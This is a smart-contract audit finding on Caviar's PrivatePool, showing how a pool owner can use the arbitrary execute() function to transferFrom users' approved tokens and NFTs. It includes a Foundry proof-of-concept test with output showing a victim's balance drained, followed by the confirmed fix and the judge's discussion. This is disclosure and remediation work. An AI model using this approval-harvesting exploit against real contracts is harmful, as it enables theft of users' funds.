[H-02] PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution
Submitted byladboy233, also found byElKu,ulqiorra,decade,minhtrng,Koolex,nemveer,said,Norah,giovannidisiena,oxen,JGcarv,JGcarv,Noro,sces60107,Voyvoda,teddav,chaduke,nobody2018,0x4non,sashik_eth,Emmanuel,0xTheC0der, andRuhum
In the current implementation of the PrivatePool.sol, the function execute is meant to claim airdrop, however, we cannot assume the owner is trusted because anyone can permissionlessly create private pool.
/// @notice Executes a transaction from the pool account to a target contract. The caller must be the owner of the/// pool. This allows for use cases such as claiming airdrops./// @param target The address of the target contract./// @param data The data to send to the target contract./// @return returnData The return data of the transaction.functionexecute(addresstarget,bytesmemorydata)publicpayableonlyOwnerreturns(bytesmemory) {// call the target with the value and data(boolsuccess,bytesmemoryreturnData) =target.call{value:msg.value}(data);// if the call succeeded return the return dataif(success)returnreturnData;// if we got an error bubble up the error messageif(returnData.length>0) {// solhint-disable-next-line no-inline-assemblyassembly{letreturnData_size:=mload(returnData)revert(add(32,returnData),returnData_size)}}else{revert();}}
The owner of private pool can easily steal all ERC20 token and NFT from the user’s wallet after the user gives approval to the PrivatePool contract and the user has to give the approval to the pool to let the PrivatePool pull ERC20 token and NFT from the user when user buy or sell or change from EthRouter or directly calling PrivatePool.
The POC below shows, the owner of the PrivatePool can carefully craft payload to steal funds via arbitrary execution.
After user’s apporval, the target can be an ERC20 token address or a NFT address, the call data can be the payload of transferFrom or function.
Please add the code to Execute.t.sol so we can create a mock token:
contractMyTokenisERC20{constructor()ERC20("MyToken","MTK",18) {}functionmint(addressto,uint256amount)public{_mint(to,amount);}}
Please add the POC below to Execute.t.sol:
functiontestStealFundArbitrary_POC()public{MyTokentoken=newMyToken();addressvictim=vm.addr(1040341830);addresshacker=vm.addr(14141231201);token.mint(victim,100000ether);vm.prank(victim);token.approve(address(privatePool),type(uint256).max);console.log("token balance of victim before hack",token.balanceOf(victim));addresstarget=address(token);bytesmemorydata=abi.encodeWithSelector(ERC20.transferFrom.selector,victim,hacker,token.balanceOf(victim));privatePool.execute(target,data);console.log("token balance of victim  after hack",token.balanceOf(victim));}
We run the POC, the output is:
PSD:\2023Security\2023-04-caviar>forgetest-vv--match"testStealFundArbitrary_POC"[⠒]Compiling...[⠑]Compiling1fileswith0.8.19[⠃]Solc0.8.19finishedin8.09sCompilerrunsuccessfulRunning1testfortest/PrivatePool/Execute.t.sol:ExecuteTest[PASS]testStealFundArbitrary_POC() (gas:753699)Logs:token balance of victim before hack 100000000000000000000000token balance of victim  after hack 0
As we can see, the victim’s ERC20 token are stolen.
Recommended Mitigation Steps
We recommend the protocol not let the private pool owner perform arbtirary execution. The private pool can use the flashloan to claim the airdrop himself.
outdoteth (Caviar) confirmed and mitigated:
Fixed in:https://github.com/outdoteth/caviar-private-pools/pull/2The proposed fix is to revert if execute tries to call thebaseTokenornftcontract. It’s very unlikely a user will approve any other token than these to the pool so this serves as a sufficient check to prevent the stealing outlined in the exploit.if(target==address(baseToken) ||target==address(nft))revertInvalidTarget();
Alex the Entreprenerd (judge) commented:
@outdoteth - Wouldn’t the owner be the one owning all of the deposited assets anyway?
outdoteth (Caviar) commented:
@GalloDaSballo - The exploit is not about the owner having ownership over owned deposits but rather about stealing non-deposited user funds.For example,Alice wants to sell her Milady 123. She also holds Milady 555 and 111.She approves the PrivatePool to spend all of her Miladies so that she can subsequently call “sell()”The malicious owner of the pool then calls “execute()” multiple times with a payload that calls the Milady contract andtransferFromto transfer all of her Miladies (123, 555, 111) from her walletAlice has now lost all of her Miladies. The same also applies to baseToken approvals when Alice wants to buy some NFTs.The proposed fix is to preventexecute()from being able to call thebaseTokenornftcontracts so that the above example can never occur.
Alex the Entreprenerd (judge) commented:
Thank you @outdoteth for clarifying.
Alex the Entreprenerd (judge) commented:
The Warden has shown how, because of thesetApprovalForAllpattern, mixed with theexecutefunction, aPrivatePoolmay be used to harvest approvals from users, causing them to lose all tokens.I have considered downgrading the finding because of the Router technically providing a safety check against the pool.However, I believe that the risky pattern of direct approvals to the pool is demonstrated by the pull transfer performed by the FlashLoan function:https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L648-L649ERC721(token).safeTransferFrom(address(receiver),address(this),tokenId);For that call to work, the user / user-contract will have to have approved the pool directly.For this reason I agree with High Severity.
Status:Mitigation confirmed with comments. Full details in reports fromrbserver,KrisApostolov, andrvierdiiev.